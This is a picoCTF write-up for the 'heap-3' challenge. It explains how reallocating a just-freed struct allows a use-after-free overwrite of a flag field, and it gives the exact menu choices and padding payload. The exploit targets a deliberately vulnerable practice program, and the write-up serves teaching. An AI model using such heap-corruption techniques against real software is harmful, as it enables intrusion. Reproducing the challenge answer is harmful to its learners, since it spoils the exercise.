# heap-3
picoCTF Link: [https://play.picoctf.org/practice/challenge/440](https://play.picoctf.org/practice/challenge/440)

## About

```
Description:
This program mishandles memory. Can you exploit it to get the flag?

Hints:
1. Check out "use after free"
```

## Solution

The solution is similar to [heap-0](heap-0.md) and [heap-1](heap-1.md), but not quite.

This time, we have an `object` struct that contains 35 total bytes.

```c
typedef struct {
  char a[10];
  char b[10];
  char c[10];
  char flag[5];
} object;
```

I searched for "use after free", as the hints suggested, and found out that if we `malloc`, we will get whatever was just freed if there is enough space in memory. That means we get the same address as the `x` we just freed.

With that, all that is left to do is asking for 35 bytes of data and write to it. Since the flag is stored after 3 arrays of 10 chars, we have to write 30 bytes before writing the actual flag.

## Answer

```
Enter your choice: 5
Enter your choice: 2
Size of object allocation: 35
Data for buffer: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAApico
Enter your choice: 4
```